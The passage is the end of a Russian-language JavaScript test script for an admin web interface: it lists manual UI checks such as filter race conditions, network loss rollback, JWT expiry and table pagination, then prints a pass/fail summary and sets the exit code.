        Ожидание: Tab B не обновится автоматически (нет WebSocket), но действие выполнится
        Риск: Tab B показывает старый статус — ОК, это expected без realtime

[UI-03] Смена статус-фильтра пока идёт загрузка
        Кликните ACTIVE → сразу HIDDEN → сразу DRAFT
        Ожидание: показывает DRAFT, нет гонки ответов
        Риск: useFetch не отменяет предыдущие запросы (нет AbortController)
        TODO: добавить AbortController в lib/hooks.ts

[UI-04] Архивация товара при фильтре ACTIVE
        Ожидание: товар исчезает из списка после архивации (optimistic update работает)
        Статус: ✅ есть localProducts + setLocalProducts в ProductsPage

[UI-05] Потеря сети во время действия
        Отключить сеть в DevTools → кликнуть Hide
        Ожидание: optimistic update виден → rollback через ~10s → показан error banner

[UI-06] JWT истечёт пока открыта страница
        Открыть страницу → подождать истечения (или вручную удалить токен)
        Ожидание: следующий запрос вернёт 401 → redirect на /login
        Статус: проверить lib/api.ts refresh логику

[UI-07] Sidebar DatabasePage collapse во время загрузки таблицы
        Ожидание: анимация collapse без layout jump, таблица продолжает загружаться

[UI-08] Очень длинное название таблицы в sidebar
        Ожидание: overflow:hidden + textOverflow:ellipsis — проверить визуально

[UI-09] Поиск в DatabasePage пока предыдущий поиск грузится
        Ожидание: показывается результат последнего поиска, не race
        TODO: AbortController для rowsData useFetch

[UI-10] InsertModal — отправить пустую форму
        Ожидание: валидация на бэке вернёт 400 → показать ошибку в модалке
        Статус: ✅ есть err state в InsertModal

[UI-11] EditModal — покинуть страницу (другой пункт меню) пока saving=true
        Ожидание: запрос завершится (no unmount cancel), состояние БД консистентно

[UI-12] RTL-текст в ячейках таблицы DatabasePage
        Вставить арабский текст в edit modal
        Ожидание: рендерится корректно (нет layout破壊)

[UI-13] 1000+ строк в таблице (большой offset)
        Перейти на последнюю страницу большой таблицы
        Ожидание: пагинация работает, нет OOM
`)

  // ────────────────────────────────────────────────────────────────────────────
  // Итоговый отчёт
  // ────────────────────────────────────────────────────────────────────────────

  const total = results.pass + results.fail + results.warn + results.skip
  console.log(`\n${c.bold}━━━ Итог ━━━${c.reset}`)
  console.log(`${c.green}✅ PASS: ${results.pass}${c.reset}`)
  console.log(`${c.red}❌ FAIL: ${results.fail}${c.reset}`)
  console.log(`${c.yellow}⚠️  WARN: ${results.warn}${c.reset}`)
  console.log(`${c.gray}⏭️  SKIP: ${results.skip}${c.reset}`)
  console.log(`${c.gray}   TOTAL: ${total}${c.reset}`)

  if (results.fail > 0) {
    console.log(`\n${c.red}${c.bold}⚠️  ЕСТЬ КРИТИЧЕСКИЕ ПРОБЛЕМЫ — требуют исправления!${c.reset}`)
    process.exit(1)
  } else if (results.warn > 0) {
    console.log(`\n${c.yellow}ℹ️  Предупреждения есть, но критических ошибок нет.${c.reset}`)
  } else if (!DRY) {
    console.log(`\n${c.green}${c.bold}✅ Все тесты прошли!${c.reset}`)
  } else {
    console.log(`\n${c.cyan}Dry run завершён. Запусти с --token=<JWT> для реальных проверок.${c.reset}`)
  }
}

run().catch(e => {
  console.error(`\n${c.red}Fatal: ${e.message}${c.reset}`)
  console.error(e.stack)
  process.exit(1)
})
